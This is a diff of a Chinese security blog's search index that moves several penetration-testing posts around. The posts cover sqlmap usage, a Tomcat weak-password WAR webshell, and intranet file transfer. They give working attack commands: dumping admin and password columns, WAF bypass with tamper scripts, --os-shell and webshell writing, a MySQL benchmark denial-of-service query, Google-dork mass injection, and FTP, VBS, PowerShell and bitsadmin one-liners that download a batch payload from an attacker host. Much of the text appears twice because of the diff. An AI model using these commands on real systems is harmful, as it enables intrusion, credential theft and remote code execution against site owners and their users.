-<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a></p>
-<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
-<h4 id="自动的搜索"><a href="#自动的搜索" class="headerlink" title="自动的搜索"></a>自动的搜索</h4><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms</code></p>
-<h4 id="指定参数搜索"><a href="#指定参数搜索" class="headerlink" title="指定参数搜索"></a>指定参数搜索</h4><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data &quot;tfUName=321&amp;tfUPass=321&quot;</code></p>
-<h3 id="SQLMAP中Google搜索注入"><a href="#SQLMAP中Google搜索注入" class="headerlink" title="SQLMAP中Google搜索注入"></a>SQLMAP中Google搜索注入</h3><p>inurl后面的语言是由自己定的<br>注入过程中如果选y是注入，如果不是选n</p>
-<p><code>sqlmap -g inurl:php?id=</code></p>
-<h3 id="SQLMAP中的请求延迟"><a href="#SQLMAP中的请求延迟" class="headerlink" title="SQLMAP中的请求延迟"></a>SQLMAP中的请求延迟</h3><p>参数 –delay –safe-freq</p>
-<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</code></p>
-<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</code></p>
-<h3 id="SQLMAP绕过WAF防火墙"><a href="#SQLMAP绕过WAF防火墙" class="headerlink" title="SQLMAP绕过WAF防火墙"></a>SQLMAP绕过WAF防火墙</h3><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
-<p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</code></p>
-<p><code>space2morehash.py</code>中可以替换<code>space2hash.py</code>或者<code>base64encode.py</code>或者<code>charencode.py</code>都是编码方式</p>
-<h3 id="SQLMAP查看权限"><a href="#SQLMAP查看权限" class="headerlink" title="SQLMAP查看权限"></a>SQLMAP查看权限</h3><p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges</code></p>
-<h3 id="SQLMAP伪静态注入"><a href="#SQLMAP伪静态注入" class="headerlink" title="SQLMAP伪静态注入"></a>SQLMAP伪静态注入</h3><ul>
-<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</code></p>
-</li>
-<li><p>通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</code></p>
-</li>
-<li><p>通过2中的数据表得到字段(假如得到的是tablename表)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
-tablename --columns</code></p>
-</li>
-<li><p>通过3得到字段值(假如从3中得到字段id，password)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
-tablename -C &quot;password&quot; --dump</code></p>
-</li>
-</ul>
-<h3 id="SQLMAP注入点执行命令与交互写shell"><a href="#SQLMAP注入点执行命令与交互写shell" class="headerlink" title="SQLMAP注入点执行命令与交互写shell"></a>SQLMAP注入点执行命令与交互写shell</h3><ul>
-<li><p>注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>此处采用的是Linux系统<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/ </p>
-</li>
-<li><p>获取Shell<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/<br>输入ipconfig/all<br>创建用户和删除用户<br>只要权限足够大，你可以输入使用任何命令。<br>其他命令参考下面：<br>从数据库中搜索字段<br><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code></p>
-</li>
-</ul>
-<p>在dedecms数据库中搜索字段<code>admin</code>或者<code>password</code>。</p>
-<p>读取与写入文件</p>
-<p>首先找需要网站的物理路径，其次需要有可写或可读权限。<br><code>–file-read=RFILE</code> 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p><code>–file-write=WFILE</code> 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p><code>–file-dest=DFILE</code> 后端的数据库管理系统写入文件的绝对路径</p>
-<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</code></p>
-<p>使用shell命令：<br><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</code></p>
-<p>接下来指定网站可写目录：<br><code>“E:\php\htdocs\dvwa”</code></p>
-<ul>
-<li>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</li>
-</ul>
-<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><ul>
-<li><p>-is-dba 当前用户权限（是否为root权限）</p>
-</li>
-<li><p>-dbs 所有数据库</p>
-</li>
-<li><p>-current-db 网站当前数据库</p>
-</li>
-<li><p>-users 所有数据库用户</p>
-</li>
-<li><p>-current-user 当前数据库用户</p>
-</li>
-<li><p>-random-agent 构造随机user-agent</p>
-</li>
-<li><p>-passwords 数据库密码</p>
-</li>
-<li><p>-proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p>
-</li>
-<li><p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2292,6 +2164,134 @@ tablename -C &quot;password&quot; --dump</code></p>
       </tags>
   </entry>
   <entry>
+    <title>sqlmap的基本使用</title>
+    <url>/posts/8141.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。</p>
+<a id="more"></a>
+<h2 id="一共有11种常见SQLmap使用方法："><a href="#一共有11种常见SQLmap使用方法：" class="headerlink" title="一共有11种常见SQLmap使用方法："></a>一共有11种常见SQLmap使用方法：</h2><h3 id="SQLmap用于Access数据库注入"><a href="#SQLmap用于Access数据库注入" class="headerlink" title="SQLmap用于Access数据库注入"></a>SQLmap用于Access数据库注入</h3><ul>
+<li><p>猜解是否能注入<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</code></p>
+</li>
+<li><p>猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</code></p>
+</li>
+<li><p>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</code></p>
+</li>
+<li><p>根据字段猜解内容(假如通过3得到字段为username和password)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot;</code></p>
+</li>
+</ul>
+<h3 id="SQLMAP用于Cookie注入"><a href="#SQLMAP用于Cookie注入" class="headerlink" title="SQLMAP用于Cookie注入"></a>SQLMAP用于Cookie注入</h3><ul>
+<li><p>cookie注入，猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</code></p>
+</li>
+<li><p>猜解字段，(通过1的表猜解字段，假如表为admin)<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2</code></p>
+</li>
+<li><p>猜解内容<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T
+admin -C &quot;username,password&quot; --level 2</code></p>
+</li>
+</ul>
+<h3 id="SQLMAP用于mysql中DDOS攻击"><a href="#SQLMAP用于mysql中DDOS攻击" class="headerlink" title="SQLMAP用于mysql中DDOS攻击"></a>SQLMAP用于mysql中DDOS攻击</h3><ul>
+<li><p>获取一个Shell<br><code>python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell</code></p>
+</li>
+<li><p>输入执行语句完成DDOS攻击<br><code>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</code></p>
+</li>
+</ul>
+<h3 id="SQLMAP用于mysql注入"><a href="#SQLMAP用于mysql注入" class="headerlink" title="SQLMAP用于mysql注入"></a>SQLMAP用于mysql注入</h3><ul>
+<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</code></p>
+</li>
+<li><p>通过第一步的数据库查找表(假如数据库名为dataname)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables</code></p>
+</li>
+<li><p>通过2中的表得出列名(假如表为table_name)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</code></p>
+</li>
+<li><p>获取字段的值(假如扫描出id,user,password字段)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C
+&quot;id,user,password&quot; --dump</code></p>
+</li>
+</ul>
+<h3 id="SQLMAP中post登陆框注入"><a href="#SQLMAP中post登陆框注入" class="headerlink" title="SQLMAP中post登陆框注入"></a>SQLMAP中post登陆框注入</h3><h4 id="其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件"><a href="#其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件" class="headerlink" title="其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件"></a>其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</h4><p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
+<ol>
+<li><p>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</p>
+</li>
+<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
+</li>
+<li><p>点击login表单的submit按钮</p>
+</li>
+<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
+</li>
+<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
+</li>
+<li><p>运行sqlmap并使用如下命令：<br><code>./sqlmap.py -r search-test.txt -p tfUPass</code></p>
+</li>
+</ol>
+<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
+<h4 id="自动的搜索"><a href="#自动的搜索" class="headerlink" title="自动的搜索"></a>自动的搜索</h4><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms</code></p>
+<h4 id="指定参数搜索"><a href="#指定参数搜索" class="headerlink" title="指定参数搜索"></a>指定参数搜索</h4><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data &quot;tfUName=321&amp;tfUPass=321&quot;</code></p>
+<h3 id="SQLMAP中Google搜索注入"><a href="#SQLMAP中Google搜索注入" class="headerlink" title="SQLMAP中Google搜索注入"></a>SQLMAP中Google搜索注入</h3><p>inurl后面的语言是由自己定的<br>注入过程中如果选y是注入，如果不是选n</p>
+<p><code>sqlmap -g inurl:php?id=</code></p>
+<h3 id="SQLMAP中的请求延迟"><a href="#SQLMAP中的请求延迟" class="headerlink" title="SQLMAP中的请求延迟"></a>SQLMAP中的请求延迟</h3><p>参数 –delay –safe-freq</p>
+<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</code></p>
+<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</code></p>
+<h3 id="SQLMAP绕过WAF防火墙"><a href="#SQLMAP绕过WAF防火墙" class="headerlink" title="SQLMAP绕过WAF防火墙"></a>SQLMAP绕过WAF防火墙</h3><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
+<p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</code></p>
+<p><code>space2morehash.py</code>中可以替换<code>space2hash.py</code>或者<code>base64encode.py</code>或者<code>charencode.py</code>都是编码方式</p>
+<h3 id="SQLMAP查看权限"><a href="#SQLMAP查看权限" class="headerlink" title="SQLMAP查看权限"></a>SQLMAP查看权限</h3><p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges</code></p>
+<h3 id="SQLMAP伪静态注入"><a href="#SQLMAP伪静态注入" class="headerlink" title="SQLMAP伪静态注入"></a>SQLMAP伪静态注入</h3><ul>
+<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</code></p>
+</li>
+<li><p>通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</code></p>
+</li>
+<li><p>通过2中的数据表得到字段(假如得到的是tablename表)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
+tablename --columns</code></p>
+</li>
+<li><p>通过3得到字段值(假如从3中得到字段id，password)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
+tablename -C &quot;password&quot; --dump</code></p>
+</li>
+</ul>
+<h3 id="SQLMAP注入点执行命令与交互写shell"><a href="#SQLMAP注入点执行命令与交互写shell" class="headerlink" title="SQLMAP注入点执行命令与交互写shell"></a>SQLMAP注入点执行命令与交互写shell</h3><ul>
+<li><p>注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>此处采用的是Linux系统<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/ </p>
+</li>
+<li><p>获取Shell<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/<br>输入ipconfig/all<br>创建用户和删除用户<br>只要权限足够大，你可以输入使用任何命令。<br>其他命令参考下面：<br>从数据库中搜索字段<br><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code></p>
+</li>
+</ul>
+<p>在dedecms数据库中搜索字段<code>admin</code>或者<code>password</code>。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。<br><code>–file-read=RFILE</code> 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p><code>–file-write=WFILE</code> 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p><code>–file-dest=DFILE</code> 后端的数据库管理系统写入文件的绝对路径</p>
+<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</code></p>
+<p>使用shell命令：<br><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</code></p>
+<p>接下来指定网站可写目录：<br><code>“E:\php\htdocs\dvwa”</code></p>
+<ul>
+<li>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</li>
+</ul>
+<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><ul>
+<li><p>-is-dba 当前用户权限（是否为root权限）</p>
+</li>
+<li><p>-dbs 所有数据库</p>
+</li>
+<li><p>-current-db 网站当前数据库</p>
+</li>
+<li><p>-users 所有数据库用户</p>
+</li>
+<li><p>-current-user 当前数据库用户</p>
+</li>
+<li><p>-random-agent 构造随机user-agent</p>
+</li>
+<li><p>-passwords 数据库密码</p>
+</li>
+<li><p>-proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p>
+</li>
+<li><p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入之盲注</title>
     <url>/posts/24339.html</url>
     <content><![CDATA[<h2 id="0x00-基于布尔盲注"><a href="#0x00-基于布尔盲注" class="headerlink" title="0x00 基于布尔盲注"></a>0x00 基于布尔盲注</h2><p>截取字符串常用函数：<br>① MID(column_name,start[,length])      //截取字符串的一部分</p>
@@ -2411,6 +2411,32 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>tomcat复现之弱口令&amp;后台getshell</title>
+    <url>/posts/30841.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>漏洞地址： <a href="http://192.168.220.141:8080/manager/html" target="_blank" rel="noopener">http://192.168.220.141:8080/manager/html</a></p>
+<p>输入用户名： tomcat<br>密码： tomcat</p>
+<p>进入后台</p>
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><ol>
+<li><p>制作war包</p>
+<p>将木马打包成压缩包文件，修改后缀名为war</p>
+</li>
+<li><p>上传war包</p>
+<p><img src="/posts/30841/1.png" alt="上传war包"></p>
+</li>
+<li><p>输入密码，get shell！！！</p>
+<p><img src="/posts/30841/2.png" alt="get shell"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tomcat复现之远程代码执行漏洞</title>
     <url>/posts/21635.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（默认关闭），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
@@ -2447,32 +2473,6 @@ string substr(string, start, length)
 <p><img src="/posts/21635/5.png" alt="命令执行"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。</p>
 <p>根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险； 注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tomcat复现之弱口令&amp;后台getshell</title>
-    <url>/posts/30841.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>漏洞地址： <a href="http://192.168.220.141:8080/manager/html" target="_blank" rel="noopener">http://192.168.220.141:8080/manager/html</a></p>
-<p>输入用户名： tomcat<br>密码： tomcat</p>
-<p>进入后台</p>
-<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><ol>
-<li><p>制作war包</p>
-<p>将木马打包成压缩包文件，修改后缀名为war</p>
-</li>
-<li><p>上传war包</p>
-<p><img src="/posts/30841/1.png" alt="上传war包"></p>
-</li>
-<li><p>输入密码，get shell！！！</p>
-<p><img src="/posts/30841/2.png" alt="get shell"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2698,34 +2698,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>内网文件下载传输</title>
-    <url>/posts/31532.html</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/31532/1.png" alt></p>
-<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Set xPost&#x3D;createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet&#x3D;createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode&#x3D;3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type&#x3D;1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure>
-<p>这样会在当前目录生成test.vbs<br>然后执行：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/31532/2.png" alt></p>
-<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
-<p>test.ps1内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$d &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/31532/3.png" alt></p>
-<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第二种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第三种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第四种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer aa http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第五种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info aa &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete aa</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>利用msfvenom生成木马</title>
     <url>/posts/2084.html</url>
     <content><![CDATA[<h2 id="0x00-msfvenom简介"><a href="#0x00-msfvenom简介" class="headerlink" title="0x00 msfvenom简介"></a>0x00 msfvenom简介</h2><p><img src="/posts/2084/1" alt="image-20200505211453615"></p>
@@ -2862,6 +2834,34 @@ string substr(string, start, length)
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网文件下载传输</title>
+    <url>/posts/31532.html</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/31532/1.png" alt></p>
+<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Set xPost&#x3D;createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet&#x3D;createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode&#x3D;3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type&#x3D;1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure>
+<p>这样会在当前目录生成test.vbs<br>然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
